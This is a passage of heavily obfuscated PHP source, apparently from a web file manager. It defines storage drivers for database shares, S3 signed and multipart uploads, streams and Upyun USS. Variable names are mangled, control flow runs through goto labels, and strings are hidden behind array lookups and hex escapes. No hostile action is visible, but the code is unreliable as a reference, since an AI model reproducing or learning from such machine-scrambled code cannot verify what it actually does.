download($D„Ó³Ìµëˆ, $f†‘£ÇÃ» = '') { $CñÕÔÀÒÀ = get_path_father($f†‘£ÇÃ»); $f¦Ş¤¿™ = get_path_this($f†‘£ÇÃ»); $DÓ“ÀÃ¨™ = $this->model->fileInfoGet($D„Ó³Ìµëˆ); $fÈĞÖÜĞØ = IO::copy($DÓ“ÀÃ¨™[$_SERVER[Ä¿Ş°¨][75]], $CñÕÔÀÒÀ, !1, $f¦Ş¤¿™); return $fÈĞÖÜĞØ; } public function upload($eßñ›•ƒ’é, $Cñóì¨ñ‹’, $aí‡Ä—‡‡Ó = false, $b›çô¾Şí¡ = REPEAT_REPLACE) { $BâÙˆñŒÉƒ =& $_SERVER[Ä¿Ş°¨]; $e¢âôõŒ–½ = $this->parse($eßñ›•ƒ’é); $FÙçÕ÷Œ”ò = $this->model->addFile($e¢âôõŒ–½[$BâÙˆñŒÉƒ[372]], $Cñóì¨ñ‹’, $e¢âôõŒ–½[$BâÙˆñŒÉƒ[75]], $aí‡Ä—‡‡Ó, $b›çô¾Şí¡); return $this->getPathOuter($FÙçÕ÷Œ”ò); } public function uploadFileByID($FÚ°æ­Èóõ, $fµ‰”íË•À, $C…Ç§›å“÷) { $e ¼•è˜¡À =& $_SERVER[Ä¿Ş°¨]; $F‡³·´ø = $this->parse($FÚ°æ­Èóõ); $c®ÒØ³´ = $this->model->addFileByFileID($F‡³·´ø[$e ¼•è˜¡À[372]], $fµ‰”íË•À, $F‡³·´ø[$e ¼•è˜¡À[75]], $C…Ç§›å“÷); return $this->getPathOuter($c®ÒØ³´); } public function addFileByRemote($C ´¤£­õŒ, $cÁ±‘ŠÆ½Ñ, $e¤İìÚŸÚá = array(), $B•ÛêÎ‡Ö = '', $aŠÁºä¾áØ) { $E×±ç²¬Å =& $_SERVER[Ä¿Ş°¨]; $dä´„¿°…± = $this->parse($C ´¤£­õŒ); $B•ÛêÎ‡Ö = empty($B•ÛêÎ‡Ö) ? $dä´„¿°…±[$E×±ç²¬Å[75]] : $B•ÛêÎ‡Ö; $EˆçèƒêĞö = $this->model->addFileByRemote($dä´„¿°…±[$E×±ç²¬Å[372]], $cÁ±‘ŠÆ½Ñ, $B•ÛêÎ‡Ö, $e¤İìÚŸÚá, $aŠÁºä¾áØ); return $this->getPathOuter($EˆçèƒêĞö); } public function uploadLink($cÉ×ã™ÙîÙ, $Cêê‡ˆÇ = 0) { $BÚ¯™Â¹ò =& $_SERVER[Ä¿Ş°¨]; $AÄ‹ŸÖÊ = $this->parse($cÉ×ã™ÙîÙ); $cÉ×ã™ÙîÙ = Model($BÚ¯™Â¹ò[548])->createFileName($AÄ‹ŸÖÊ[$BÚ¯™Â¹ò[75]]); $b¾õƒ•‚Ú = IO::uploadLink($cÉ×ã™ÙîÙ, $Cêê‡ˆÇ); return $b¾õƒ•‚Ú; } public function fileNameAuto($DïğÒÓÃˆã, $c¯ÄĞÍ , $bÒª¨ÊŸ½á = REPEAT_REPLACE, $B¥Ë¤íĞçÏ = false) { return $this->model->fileNameAuto($DïğÒÓÃˆã, $c¯ÄĞÍ , $bÒª¨ÊŸ½á, $B¥Ë¤íĞçÏ); } public function fileNameExist($E­ì„®Ó³, $a“‘Ì ‡—È) { return $this->model->fileNameExist($E­ì„®Ó³, $a“‘Ì ‡—È); } protected function _fileOut($f›ÌÖîôÅ·, $dìÌì‚ô†– = false, $E¦ìÌÎ°‰ = false, $bù¬Øë•ÙÊ = '', $d—ÆÎŠ©¡Ì = false) { goto eá»¨¡Å·›; eá»¨¡Å·›: $B×ŠŸç¦Ê =& $_SERVER[Ä¿Ş°¨]; $Fª¿äµ× à = $this->model->sourceInfo($f›ÌÖîôÅ·); if ($Fª¿äµ× à[$B×ŠŸç¦Ê[375]] == $B×ŠŸç¦Ê[83]) { header($B×ŠŸç¦Ê[1097]); die; } goto BèŠÑ‚ª³; BèŠÑ‚ª³: $c¿Ï×Îùîš = $this->model->fileInfoGet($f›ÌÖîôÅ·); $bù¬Øë•ÙÊ = $c¿Ï×Îùîš[$B×ŠŸç¦Ê[159]] ? $c¿Ï×Îùîš[$B×ŠŸç¦Ê[159]] : $bù¬Øë•ÙÊ; $Dì™ö÷Ñã¶ = isset($GLOBALS[$B×ŠŸç¦Ê[1098]]) ? $GLOBALS[$B×ŠŸç¦Ê[1098]] : $Fª¿äµ× à[$B×ŠŸç¦Ê[28]]; goto fõñ„ª¬ÄË; fõñ„ª¬ÄË: if ($d—ÆÎŠ©¡Ì) { return IO::fileOutServer($c¿Ï×Îùîš[$B×ŠŸç¦Ê[75]], $dìÌì‚ô†–, $Dì™ö÷Ñã¶, $bù¬Øë•ÙÊ); } IO::fileOut($c¿Ï×Îùîš[$B×ŠŸç¦Ê[75]], $dìÌì‚ô†–, $Dì™ö÷Ñã¶, $bù¬Øë•ÙÊ); goto Döî´ƒÄ§ƒ; Döî´ƒÄ§ƒ: } public function fileOut($Eçâ»…– À, $aÔÍ£¶Äø = false, $d²šŸƒİíß = false, $Aš›÷·Æˆ = '') { $this->_fileOut($Eçâ»…– À, $aÔÍ£¶Äø, $d²šŸƒİíß, $Aš›÷·Æˆ); } public function fileOutServer($cñÂóºŠå£, $D¹æÓÉÑ÷ï = false, $cøâ‚Ùğ§Ë = false, $eš±ã»…• = '') { $this->_fileOut($cñÂóºŠå£, $D¹æÓÉÑ÷ï, $cøâ‚Ùğ§Ë, $eš±ã»…•, !0); } protected function _fileOutImage($C„›öˆê„, $a±ƒ²šòèî = 250) { $b”îç—™‰Ç =& $_SERVER[Ä¿Ş°¨]; $Fìß¡à¹›É = $this->model->sourceInfo($C„›öˆê„); if ($Fìß¡à¹›É[$b”îç—™‰Ç[375]] == $b”îç—™‰Ç[83]) { show_json($b”îç—™‰Ç[1099] . $C„›öˆê„, !1); } $GLOBALS[$b”îç—™‰Ç[1098]] = $Fìß¡à¹›É[$b”îç—™‰Ç[28]]; $Bé³øñä = $this->model->fileInfoGet($C„›öˆê„); IO::fileOutImage($Bé³øñä[$b”îç—™‰Ç[75]], $a±ƒ²šòèî); } public function fileOutImage($Aƒ¡Úø÷â¥, $c»‡±Î…Ñ = 250) { $this->_fileOutImage($Aƒ¡Úø÷â¥, $c»‡±Î…Ñ); } public function fileOutImageServer($d¤ò‡Ÿ§×¤, $BÄ¿ö÷«„ = 250) { $this->_fileOutImage($d¤ò‡Ÿ§×¤, $BÄ¿ö÷«„); } public function link($A™çŒÁ„½, $CÉ‰¶” ×‡ = '') { $F–Â†‘ = $this->model->fileInfoGet($A™çŒÁ„½); return IO::link($F–Â†‘[$_SERVER[Ä¿Ş°¨][75]], $CÉ‰¶” ×‡); } protected function parse($Aô…ŠÛ¦ Ï) { $bÕÆ³½™á‘ =& $_SERVER[Ä¿Ş°¨]; if (strstr($Aô…ŠÛ¦ Ï, $bÕÆ³½™á‘[8]) === !1) { return array($bÕÆ³½™á‘[390] => intval($Aô…ŠÛ¦ Ï), $bÕÆ³½™á‘[75] => $bÕÆ³½™á‘[33], $bÕÆ³½™á‘[1096] => array()); } $Cª­ ¾ñ = explode($bÕÆ³½™á‘[8], trim($Aô…ŠÛ¦ Ï, $bÕÆ³½™á‘[8])); if (count($Cª­ ¾ñ) < 2) { show_tips($Aô…ŠÛ¦ Ï . $bÕÆ³½™á‘[1100]); } return array($bÕÆ³½™á‘[390] => intval($Cª­ ¾ñ[0]), $bÕÆ³½™á‘[75] => $Cª­ ¾ñ[1], $bÕÆ³½™á‘[1096] => array_slice($Cª­ ¾ñ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($C…—¿…·Æî) { $this->pathParse = $C…—¿…·Æî; $this->model = Model($_SERVER[Ä¿Ş°¨][1095]); } public function getPathOuter($fÅ¸‰ïàš„) { $FÉ†ëÇåº =& $_SERVER[Ä¿Ş°¨]; if (!$fÅ¸‰ïàš„) { return $fÅ¸‰ïàš„; } $F¡Ê„İÍî§ = $this->parse($fÅ¸‰ïàš„); return trim(KodIO::makeShare($this->pathParse[$FÉ†ëÇåº[372]], $F¡Ê„İÍî§[$FÉ†ëÇåº[372]]), $FÉ†ëÇåº[8]); } protected function infoParse($E†ö§¤‰Öœ, $F’ÁË©ÇÅ = false, $BòïÎ¶Ø´† = false) { $bŞƒ©…ÚŠ =& $_SERVER[Ä¿Ş°¨]; $c—˜ˆ½«ïª = $this->pathParse[$bŞƒ©…ÚŠ[372]]; $A»Êá³¹é = trim($this->pathParse[$bŞƒ©…ÚŠ[996]], $bŞƒ©…ÚŠ[8]); return Action($bŞƒ©…ÚŠ[1101])->sharePathInfo($c—˜ˆ½«ïª, $A»Êá³¹é); } public function infoFull($c¾²™‹ğï) { $e«Œì¢ŞêÏ =& $_SERVER[Ä¿Ş°¨]; $Fº¡¿ÜÊ¯‰ = explode($e«Œì¢ŞêÏ[8], trim($c¾²™‹ğï, $e«Œì¢ŞêÏ[8])); if (count($Fº¡¿ÜÊ¯‰) > 1) { $DßÁÛ½Êæƒ = implode($e«Œì¢ŞêÏ[8], array_splice($Fº¡¿ÜÊ¯‰, 1)); $eÆ¹±Şèªì = $this->model->pathInfoByPath($Fº¡¿ÜÊ¯‰[0], $DßÁÛ½Êæƒ); if (!$eÆ¹±Şèªì) { return !1; } $this->pathParse[$e«Œì¢ŞêÏ[996]] = $eÆ¹±Şèªì[$e«Œì¢ŞêÏ[374]]; } return $this->infoParse($c¾²™‹ğï); } public function listAll($bÔÇ‘¾ìêØ) { goto FĞòõˆè»Œ; Aëá»­øƒ: $d®àÙæÅó = $this->model->listAll($bÔÇ‘¾ìêØ); $cÂîÅøÃˆ» = Model($FÂ½¬ÑĞ¼[540])->getInfo($cà³‰åË[$FÂ½¬ÑĞ¼[445]]); $BÌˆ¼¿¥›¾ = Action($FÂ½¬ÑĞ¼[1101]); goto cÉŞØèÅæ«; cÉŞØèÅæ«: foreach ($d®àÙæÅó as &$fÍÜ¦Á¯ã) { check_abort(); $fÍÜ¦Á¯ã[$FÂ½¬ÑĞ¼[396]] = $BÌˆ¼¿¥›¾->_shareItemeParse($fÍÜ¦Á¯ã[$FÂ½¬ÑĞ¼[396]], $cÂîÅøÃˆ»); } return $d®àÙæÅó; goto f¥ºçÀË‹™; FĞòõˆè»Œ: $FÂ½¬ÑĞ¼ =& $_SERVER[Ä¿Ş°¨]; $cà³‰åË = IO::info($this->pathParse[$FÂ½¬ÑĞ¼[75]]); if (!$cà³‰åË) { return array(); } goto Aëá»­øƒ; f¥ºçÀË‹™: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($eÌ“Û´ÎÏ›) { $this->pathParse = $eÌ“Û´ÎÏ›; $this->model = Model($_SERVER[Ä¿Ş°¨][1095]); } protected function infoParse($C¥áÏ£ğôå, $bÎ“ÊÂŞ‹¾ = false, $aÙŸò ì¿ = false) { $böÊ‰¤´Ò£ =& $_SERVER[Ä¿Ş°¨]; return Action($böÊ‰¤´Ò£[1002])->sharePathInfo($this->pathParse[$böÊ‰¤´Ò£[75]], !0); } public function listPath($AÌ¸‚Ö²›, $cà¶ŸßËà = false) { $EöÎÔ¿÷è =& $_SERVER[Ä¿Ş°¨]; $aïŞçÚ†Ş = parent::listPath($AÌ¸‚Ö²›, $cà¶ŸßËà); foreach ($aïŞçÚ†Ş as $DŠ¸™ÄğÄÖ => $F¶®…Œ¸ÃÀ) { if (!in_array($DŠ¸™ÄğÄÖ, array($EöÎÔ¿÷è[73], $EöÎÔ¿÷è[74]))) { continue; } foreach ($F¶®…Œ¸ÃÀ as $aôâğÏî¬Æ => $D¨ÎÚíˆêÂ) { $aïŞçÚ†Ş[$DŠ¸™ÄğÄÖ][$aôâğÏî¬Æ] = Action($EöÎÔ¿÷è[1002])->shareItemInfo($D¨ÎÚíˆêÂ); } } return $aïŞçÚ†Ş; } public function listAll($bÑÒù±ÀÊ) { $C¦Í´×ƒŒª =& $_SERVER[Ä¿Ş°¨]; $dñäÛÀÅ„ = IO::info($this->pathParse[$C¦Í´×ƒŒª[75]]); if (!$dñäÛÀÅ„) { return array(); } $E»ÂÏÖÕÓ“ = $this->model->listAll($bÑÒù±ÀÊ); foreach ($E»ÂÏÖÕÓ“ as &$aÉ‹»ôË±Œ) { $aÉ‹»ôË±Œ[$C¦Í´×ƒŒª[396]] = Action($C¦Í´×ƒŒª[1002])->shareItemInfo($aÉ‹»ôË±Œ[$C¦Í´×ƒŒª[396]]); } return $E»ÂÏÖÕÓ“; } } goto A†ï‹³°è†; D“Œ©ˆ‰Ü: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eï§¾÷‘ô®) { parent::__construct($eï§¾÷‘ô®); } public function uploadFormData($b»é¨ĞŸô, $AùìÇÛÍ„¼ = 3600) { goto aÜ÷õß½†ˆ; d­”¬®Èà‚: $AòÏ§‹¹ = $Fô£‚çòœ÷[1113]; $dÓ„Äùµ‰„ = $AùìÇÛÍ„¼ . $Fô£‚çòœ÷[33]; $dÁ â¿‘Æ = $Fô£‚çòœ÷[1078]; goto Cƒôùôç™; DÎ›ù“ïíË: $C‘ÖÍ•À£× = base64_encode(json_encode($bë½öÅ§ )); $dÄ¹Ñ‚¾èù = hash_hmac($Fô£‚çòœ÷[1121], $a…Ä–•–…, $Fô£‚çòœ÷[1122] . $this->secret, !0); $F´ŞÑª¹¾„ = hash_hmac($Fô£‚çòœ÷[1121], $this->region, $dÄ¹Ñ‚¾èù, !0); goto AÌóëå¹İò; dÛœ¡Æ·æ: $d²ÀÛÍ÷†¬ = $Fô£‚çòœ÷[59]; $DÈĞÊÀ¦½Ò = gmdate($Fô£‚çòœ÷[1112]); $a…Ä–•–… = gmdate($Fô£‚çòœ÷[684]); goto d­”¬®Èà‚; aÜ÷õß½†ˆ: $Fô£‚çòœ÷ =& $_SERVER[Ä¿Ş°¨]; $AèÏ¤Ø¤³ = $Fô£‚çòœ÷[181]; $b‚ÈœÌ¿‘È = $Fô£‚çòœ÷[1111]; goto dÛœ¡Æ·æ; AÌóëå¹İò: $b®¿Å×ˆèß = hash_hmac($Fô£‚çòœ÷[1121], $d²ÀÛÍ÷†¬, $F´ŞÑª¹¾„, !0); $f’°ê‚çæ = hash_hmac($Fô£‚çòœ÷[1121], $AòÏ§‹¹, $b®¿Å×ˆèß, !0); $F ©£ˆ½¶‘ = hash_hmac($Fô£‚çòœ÷[1121], $C‘ÖÍ•À£×, $f’°ê‚çæ); goto D‘–‘Ã®¾Ô; Cƒôùôç™: $A«ˆò´òİß = array($this->accessKey, $a…Ä–•–…, $this->region, $d²ÀÛÍ÷†¬, $AòÏ§‹¹); $cïõ¸Ç×“  = implode($Fô£‚çòœ÷[8], $A«ˆò´òİß); $bë½öÅ§  = array($Fô£‚çòœ÷[1080] => gmdate($Fô£‚çòœ÷[1079], strtotime($Fô£‚çòœ÷[1114])), $Fô£‚çòœ÷[1081] => array(array($Fô£‚çòœ÷[1083] => $this->bucket), array($Fô£‚çòœ÷[1082] => $AèÏ¤Ø¤³), array($Fô£‚çòœ÷[1084], $Fô£‚çòœ÷[1085], $Fô£‚çòœ÷[33]), array($Fô£‚çòœ÷[1084], $Fô£‚çòœ÷[1115], $Fô£‚çòœ÷[33]), array($Fô£‚çòœ÷[1084], $Fô£‚çòœ÷[1116], $Fô£‚çòœ÷[33]), array($Fô£‚çòœ÷[1086] => $dÁ â¿‘Æ), array($Fô£‚çòœ÷[1117] => $cïõ¸Ç×“ ), array($Fô£‚çòœ÷[1118] => $b‚ÈœÌ¿‘È), array($Fô£‚çòœ÷[1119] => $DÈĞÊÀ¦½Ò), array($Fô£‚çòœ÷[1120] => $dÓ„Äùµ‰„))); goto DÎ›ù“ïíË; D‘–‘Ã®¾Ô: $E¬ŠÅå¤Í– = array($Fô£‚çòœ÷[195] => $Fô£‚çòœ÷[33], $Fô£‚çòœ÷[1123] => $Fô£‚çòœ÷[33], $Fô£‚çòœ÷[1082] => $AèÏ¤Ø¤³, $Fô£‚çòœ÷[1086] => $dÁ â¿‘Æ, $Fô£‚çòœ÷[1090] => $C‘ÖÍ•À£×, $Fô£‚çòœ÷[1124] => $cïõ¸Ç×“ , $Fô£‚çòœ÷[1125] => $b‚ÈœÌ¿‘È, $Fô£‚çòœ÷[1126] => $DÈĞÊÀ¦½Ò, $Fô£‚çòœ÷[1127] => $dÓ„Äùµ‰„, $Fô£‚çòœ÷[1128] => $F ©£ˆ½¶‘, $Fô£‚çòœ÷[165] => $this->getHost()); return $E¬ŠÅå¤Í–; goto eœ‰š…Âİà; eœ‰š…Âİà: } public function multiUploadFormData($C»Ô¤¿Û¸, $c«Ÿ¦Ñê¸° = 3600) { $E§×Ö¬»¡ =& $_SERVER[Ä¿Ş°¨]; $cİ°éÔéÈÖ = gmdate($E§×Ö¬»¡[1207]); $E‡¸£Ñ‹¨ğ = array(); $CÌ¸À“™† = $this->client->getUploadId($this->bucket, $C»Ô¤¿Û¸, $E‡¸£Ñ‹¨ğ); if (!$CÌ¸À“™†) { return !1; } return array($E§×Ö¬»¡[205] => $CÌ¸À“™†, $E§×Ö¬»¡[165] => $this->getHost() . $E§×Ö¬»¡[8] . $this->pathEncode($C»Ô¤¿Û¸), $E§×Ö¬»¡[206] => $cİ°éÔéÈÖ, $E§×Ö¬»¡[89] => $C»Ô¤¿Û¸); } public function multiUploadAuthData($E…Ø£Óè²Å, $A³áÎ‘Øˆ— = array()) { goto fÁÚÂß®…; då„´í›¤†: if (strpos($C×ğ‚ç±Á¼, $FÇªÔ“¤ò[209]) === 0) { if (isset($cÂÙø»«‚š[$FÇªÔ“¤ò[1209]])) { $b…Øì˜Éƒã = $cÂÙø»«‚š[$FÇªÔ“¤ò[1209]]; } else { if (isset($eà«¹ §ç¹[$FÇªÔ“¤ò[1209]])) { $b…Øì˜Éƒã = $eà«¹ §ç¹[$FÇªÔ“¤ò[1209]]; } else { $b…Øì˜Éƒã = hash($FÇªÔ“¤ò[1121], $FÇªÔ“¤ò[33]); } } return array($FÇªÔ“¤ò[216] => $eà«¹ §ç¹[$FÇªÔ“¤ò[216]], $FÇªÔ“¤ò[1209] => $b…Øì˜Éƒã, $FÇªÔ“¤ò[206] => $eà«¹ §ç¹[$FÇªÔ“¤ò[1212]]); } return $eà«¹ §ç¹[$FÇªÔ“¤ò[216]]; goto eÆò¥í–Ûù; f”Ÿ¶Õñ‹£: $e¬¯‘›î±· = $FÇªÔ“¤ò[210]; $BåæŒë²§ß = $FÇªÔ“¤ò[8] . $this->pathEncode($aÛ×´¡¬Ù) . $C×ğ‚ç±Á¼; $eà«¹ §ç¹ = $this->client->__getSignatureV4($cÂÙø»«‚š, $FÑš°ºÇÃ™, $e¬¯‘›î±·, $BåæŒë²§ß); goto då„´í›¤†; C¹ä†­ÌĞ†: unset($A³áÎ‘Øˆ—[$FÇªÔ“¤ò[89]]); if (isset($A³áÎ‘Øˆ—[$FÇªÔ“¤ò[207]])) { return $this->listUploadParts($aÛ×´¡¬Ù, $A³áÎ‘Øˆ—); } $cÂÙø»«‚š = array(); goto f¢Ô‹Ûí; fÁÚÂß®…: $FÇªÔ“¤ò =& $_SERVER[Ä¿Ş°¨]; $C×ğ‚ç±Á¼ = isset($A³áÎ‘Øˆ—[$FÇªÔ“¤ò[156]]) ? $A³áÎ‘Øˆ—[$FÇªÔ“¤ò[156]] : $FÇªÔ“¤ò[33]; $aÛ×´¡¬Ù = $A³áÎ‘Øˆ—[$FÇªÔ“¤ò[89]]; goto C¹ä†­ÌĞ†; f¢Ô‹Ûí: if (isset($A³áÎ‘Øˆ—[$FÇªÔ“¤ò[1208]])) { $cÂÙø»«‚š[$FÇªÔ“¤ò[1209]] = $A³áÎ‘Øˆ—[$FÇªÔ“¤ò[1208]]; } $aÍ· ç“‰Œ = explode($FÇªÔ“¤ò[167], $this->getHost()); $FÑš°ºÇÃ™ = array($FÇªÔ“¤ò[1210] => $aÍ· ç“‰Œ[1], $FÇªÔ“¤ò[1211] => $FÇªÔ“¤ò[33], $FÇªÔ“¤ò[195] => $FÇªÔ“¤ò[115], $FÇªÔ“¤ò[1123] => $A³áÎ‘Øˆ—[$FÇªÔ“¤ò[77]]); goto f”Ÿ¶Õñ‹£; eÆò¥í–Ûù: } public function listUploadParts($D‚ï‘ƒöáá, $E‚ÇêˆÕ¬ = array()) { goto c´Ğ¨¹Ş¶“; CŠ—Á²ƒ—: if (!$Bç¯Ş¬»Ñ¥) { return !1; } $b¨”ŸŠÈåğ = $Fñ»ŒÎëí[1213]; foreach ($Bç¯Ş¬»Ñ¥ as $E™º’’„£Ã) { $b¨”ŸŠÈåğ .= $Fñ»ŒÎëí[1214] . "\x3c\120\141\162\164\x4e\165\x6d\142\x65\162\x3e{$E™º’’„£Ã[$Fñ»ŒÎëí[1165]]}\74\57\x50\141\162\x74\116\x75\155\142\x65\x72\x3e\12" . "\x3c\x45\x54\x61\x67\76{$E™º’’„£Ã[$Fñ»ŒÎëí[1166]]}\74\x2f\x45\x54\141\x67\76\xa" . $Fñ»ŒÎëí[1215]; } goto dÃ©­Ïñ; dÃ©­Ïñ: $b¨”ŸŠÈåğ .= $Fñ»ŒÎëí[1216]; $C‡æ†¦Ò•¹ = array(); $FŒ¸î™‡§ = explode($Fñ»ŒÎëí[167], $this->getHost()); goto E»ç÷ˆ·•; DÀÔ Ñ²õ£: $e¡ğ—²ğ‰ = $this->client->__getSignatureV4($C‡æ†¦Ò•¹, $c‹‡—‰µÄø, $aÔöÍ…À, $CÅ¾Ì±ã–½, $b¨”ŸŠÈåğ); return array($Fñ»ŒÎëí[216] => $e¡ğ—²ğ‰[$Fñ»ŒÎëí[216]], $Fñ»ŒÎëí[206] => $e¡ğ—²ğ‰[$Fñ»ŒÎëí[1212]], $Fñ»ŒÎëí[218] => $Bç¯Ş¬»Ñ¥, $Fñ»ŒÎëí[1209] => $e¡ğ—²ğ‰[$Fñ»ŒÎëí[1209]]); goto bÖºÊáİ¬Ğ; c´Ğ¨¹Ş¶“: $Fñ»ŒÎëí =& $_SERVER[Ä¿Ş°¨]; $fáÍ‘Ÿò£õ = str_replace($Fñ»ŒÎëí[217], $Fñ»ŒÎëí[33], $E‚ÇêˆÕ¬[$Fñ»ŒÎëí[156]]); $Bç¯Ş¬»Ñ¥ = $this->client->listParts($this->bucket, $D‚ï‘ƒöáá, $fáÍ‘Ÿò£õ); goto CŠ—Á²ƒ—; E»ç÷ˆ·•: $c‹‡—‰µÄø = array($Fñ»ŒÎëí[1210] => $FŒ¸î™‡§[1], $Fñ»ŒÎëí[195] => $Fñ»ŒÎëí[115], $Fñ»ŒÎëí[1123] => strlen($b¨”ŸŠÈåğ)); $aÔöÍ…À = $Fñ»ŒÎëí[208]; $CÅ¾Ì±ã–½ = $Fñ»ŒÎëí[8] . $this->pathEncode($D‚ï‘ƒöáá) . $E‚ÇêˆÕ¬[$Fñ»ŒÎëí[156]]; goto DÀÔ Ñ²õ£; bÖºÊáİ¬Ğ: } public function link($eñ“®ãŒÔÆ, $D´ñä‡àƒ› = array()) { return parent::link($eñ“®ãŒÔÆ, $D´ñä‡àƒ›); } public function fileOut($e¬ºÒ—µÇà, $A«Ô°—Òå÷ = false, $b±¸»ù‰¥œ = false, $f–Òëæ‚£ã = '') { if (strstr($this->endpoint, $_SERVER[Ä¿Ş°¨][1217])) { return parent::fileOutServer($e¬ºÒ—µÇà, $A«Ô°—Òå÷, $b±¸»ù‰¥œ, $f–Òëæ‚£ã); } parent::fileOut($e¬ºÒ—µÇà, $A«Ô°—Òå÷, $b±¸»ù‰¥œ, $f–Òëæ‚£ã); } public function fileOutImage($c”‹ï´õÑ¬, $eèØ¹¹›×ô = 250) { if (strstr($this->endpoint, $_SERVER[Ä¿Ş°¨][1217])) { return parent::fileOutImageServer($c”‹ï´õÑ¬, $eèØ¹¹›×ô); } parent::fileOutImage($c”‹ï´õÑ¬, $eèØ¹¹›×ô); } public function fileOutLink($FÁ“†ÙÛ‡¤) { $D­½³ÆŒ =& $_SERVER[Ä¿Ş°¨]; if (substr($FÁ“†ÙÛ‡¤, 0, 7) == $D­½³ÆŒ[1093]) { $FÁ“†ÙÛ‡¤ = $D­½³ÆŒ[1094] . substr($FÁ“†ÙÛ‡¤, 7); } header($D­½³ÆŒ[152] . $FÁ“†ÙÛ‡¤); die; } public function getHost() { $BŞ¼¥¼öËÚ =& $_SERVER[Ä¿Ş°¨]; $AãÒŠ´Ş‘§ = str_rtrim(parent::getHost(), $BŞ¼¥¼öËÚ[8] . $this->bucket); $AãÒŠ´Ş‘§ = explode($BŞ¼¥¼öËÚ[167], $AãÒŠ´Ş‘§); return $AãÒŠ´Ş‘§[0] . $BŞ¼¥¼öËÚ[167] . $this->bucket . $BŞ¼¥¼öËÚ[91] . $AãÒŠ´Ş‘§[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C©íÈò¢™, $b÷íØ ì•‡ = 0) { parent::__construct(); $this->source = $C©íÈò¢™; $this->sourceSize = $b÷íØ ì•‡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b•”Â…ºì = false) { return $this->sourceSize; } public function getContent($eÔ†ó³Ü‹¼ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $E—‘«¶‘ = ftell($this->source); $E§ïØƒÜ±® = @fread($this->source, $this->sourceSize); fseek($this->source, $E—‘«¶‘); return $E§ïØƒÜ±®; } } public function fileSubstr($dª‡¡¨èÀ¤ = false, $a©•‘ö•Ç = 0, $F·À—Ä„¦ = 0) { if (!$F·À—Ä„¦) { $F·À—Ä„¦ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $a©•‘ö•Ç, $F·À—Ä„¦); } if ($this->sourceType == self::TYPE_FILE) { $EÍ°Æç…Ô = ftell($this->source); fseek($this->source, $EÍ°Æç…Ô + $a©•‘ö•Ç); $FëõÎ–Ò· = @fread($this->source, $F·À—Ä„¦); fseek($this->source, $EÍ°Æç…Ô); return $FëõÎ–Ò·; } } public function hashMd5($b·¸Ôé É = false) { return md5($this->getContent()); } public static function hash($E’ŞõàÎ“, $d¦°ƒÎË¯ = 0) { $bš½÷íáñ = new PathDriverStream($E’ŞõàÎ“, $d¦°ƒÎË¯); return $bš½÷íáñ->hashSimple($E’ŞõàÎ“); } public static function md5($A •ˆ³Æ™, $Eª¹î×–›ô = 0) { $d›£‰Ö±® = new PathDriverStream($A •ˆ³Æ™, $Eª¹î×–›ô); return $d›£‰Ö±®->hashMd5($A •ˆ³Æ™); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\x2f\x2f\166\60\x2e\141\160\151\56\165\160\x79\x75\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($EñìÜÊ†óö) { parent::__construct(); $this->_init($EñìÜÊ†óö); } public function _init($bœªÉÈ—Íï) { foreach ($bœªÉÈ—Íï as $Aµ¢‚Û·– => $E‹¼…•Ø») { if (isset($this->{$Aµ¢‚Û·–})) { $this->{$Aµ¢‚Û·–} = $E‹¼…•Ø»; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Ä¿Ş°¨][1218], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E„Ç¯æğÓˆ, $E·”îö÷˜ = "\107\x45\x54") { $AŸ¯ÌÒªÆœ =& $_SERVER[Ä¿Ş°¨]; $Dùî´ŒßøŠ = gmdate($AŸ¯ÌÒªÆœ[1182]); $däÆ‹‰ñÈ¦ = base64_encode(hash_hmac($AŸ¯ÌÒªÆœ[1219], "{$E·”îö÷˜}\x26{$E„Ç¯æğÓˆ}\46{$Dùî´ŒßøŠ}", md5("{$this->userpass}"), !0)); $AŸ¥Ò’İ¦ƒ = array("\101\x75\x74\150\157\162\x69\x7a\x61\x74\151\x6f\x6e\x3a\x55\x50\x59\x55\x4e\x20{$this->username}\72{$däÆ‹‰ñÈ¦}", "\104\141\x74\145\x3a{$Dùî´ŒßøŠ}"); return $AŸ¥Ò’İ¦ƒ; } public function ussRequest($dÊŸŞ‚ˆÔ”, $cô¸Éù¾·õ = "\107\x45\x54", $EŒÌ±¤”® = false, $Eà‘†¥÷‚à = false, $eˆ¦È‘ó‡‹ = false) { goto B„–ŠÆÊâÁ; B„–ŠÆÊâÁ: $cÃ”ÚÍÔ¸Ã =& $_SERVER[Ä¿Ş°¨]; $dÊŸŞ‚ˆÔ” = trim($dÊŸŞ‚ˆÔ”, $cÃ”ÚÍÔ¸Ã[8]); $fÙˆæĞ’Œ = "\57{$this->bucket}\57{$dÊŸŞ‚ˆÔ”}"; goto e„…áß‡; dâ¸Ø˜‰¸ù: if (!$díçÚÆò†È) { return array($cÃ”ÚÍÔ¸Ã[1017] => !1, $cÃ”ÚÍÔ¸Ã[1019] => $cÃ”ÚÍÔ¸Ã[1220]); } if (strtolower($cô¸Éù¾·õ) == $cÃ”ÚÍÔ¸Ã[180] || in_array($díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[1017]], array($cÃ”ÚÍÔ¸Ã[1078], $cÃ”ÚÍÔ¸Ã[1221]))) { $EŒÌ±¤”® = $díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[1222]]; } else { $EŒÌ±¤”® = json_decode($díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[1019]], !0); if (!$EŒÌ±¤”®) { $EŒÌ±¤”® = $díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[1019]]; } else { if 